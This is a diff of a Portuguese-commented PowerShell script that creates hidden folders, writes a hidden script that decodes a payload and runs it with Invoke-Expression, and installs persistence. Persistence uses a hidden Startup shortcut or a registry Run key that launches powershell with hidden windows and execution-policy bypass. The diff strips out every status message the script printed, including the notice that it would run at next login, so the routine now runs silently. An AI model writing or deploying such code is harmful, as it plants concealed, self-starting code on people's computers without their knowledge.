@@ -10,18 +10,15 @@ function Create-HiddenDirectory {
         # Criar diretório se não existir
         if (-not (Test-Path $Path)) {
             New-Item -ItemType Directory -Path $Path -Force -ErrorAction Stop | Out-Null
-            Write-Host "Diretório criado: $Path" -ForegroundColor Green
         }
         
         # Tornar oculto (apenas Hidden, não System para evitar problemas)
         $item = Get-Item $Path -Force -ErrorAction Stop
         $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
-        Write-Host "Atributos definidos para $Path" -ForegroundColor Green
         
         return $true
     }
     catch {
-        Write-Host "Erro ao criar/ocultar $Path : $_" -ForegroundColor Red
         return $false
     }
 }
@@ -32,7 +29,6 @@ $directoriesCreated = $directoriesCreated -and (Create-HiddenDirectory -Path $Lo
 $directoriesCreated = $directoriesCreated -and (Create-HiddenDirectory -Path $TempDir)
 
 if (-not $directoriesCreated) {
-    Write-Host "Falha ao criar diretórios necessários. Abortando." -ForegroundColor Red
     exit 1
 }
 
@@ -63,31 +59,26 @@ try {
     Invoke-Expression `$decoded
 }
 catch {
-    Write-Error "Falha ao executar script: `$_"
 }
 "@
     
     $scriptContent | Out-File -FilePath $ScriptPath -Encoding UTF8 -Force
-    Write-Host "Script criado em: $ScriptPath" -ForegroundColor Green
     
     # Tornar o arquivo oculto
     $fileItem = Get-Item $ScriptPath -Force
     $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
     
 } catch {
-    Write-Host "Erro ao criar script: $_" -ForegroundColor Red
     exit 1
 }
 
 # 4. Persistência apenas via inicialização do usuário (sem tarefa agendada)
-Write-Host "Configurando persistência via inicialização..." -ForegroundColor Yellow
 
 try {
     $StartupPath = [System.Environment]::GetFolderPath('Startup')
     
     # Verificar se a pasta Startup existe
     if (-not (Test-Path $StartupPath)) {
-        Write-Host "Pasta Startup não encontrada: $StartupPath" -ForegroundColor Red
         exit 1
     }
     
@@ -107,15 +98,12 @@ try {
     $Shortcut.WorkingDirectory = $LogDir
     
     $Shortcut.Save()
-    Write-Host "Atalho de inicialização criado: $ShortcutPath" -ForegroundColor Green
     
     # Tornar o atalho oculto
     $shortcutItem = Get-Item $ShortcutPath -Force
     $shortcutItem.Attributes = $shortcutItem.Attributes -bor [System.IO.FileAttributes]::Hidden
     
 } catch {
-    Write-Host "Erro ao configurar inicialização: $_" -ForegroundColor Red
-    Write-Host "Tentando método alternativo..." -ForegroundColor Yellow
     
     # Método alternativo: Registro Run
     try {
@@ -124,26 +112,15 @@ try {
         $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
         
         New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
-        Write-Host "Persistência configurada via registro." -ForegroundColor Green
     }
     catch {
-        Write-Host "Falha ao configurar persistência via registro: $_" -ForegroundColor Red
+        
     }
 }
 
 # 5. Executar o script imediatamente (opcional)
-Write-Host "Executando script de demonstração..." -ForegroundColor Yellow
 try {
     & powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptPath
-    Write-Host "Script executado com sucesso." -ForegroundColor Green
 }
 catch {
-    Write-Host "Execução inicial falhou, mas persistência foi configurada." -ForegroundColor Yellow
 }
-
-# 6. Limpeza e informações
-Write-Host "`n=== CONFIGURAÇÃO CONCLUÍDA ===" -ForegroundColor Cyan
-Write-Host "Script principal: $ScriptPath" -ForegroundColor White
-Write-Host "Persistência: Via inicialização do usuário" -ForegroundColor White
-Write-Host "Modo de execução: Oculto (WindowStyle Hidden)" -ForegroundColor White
-Write-Host "`nO script será executado automaticamente no próximo login." -ForegroundColor Cyan
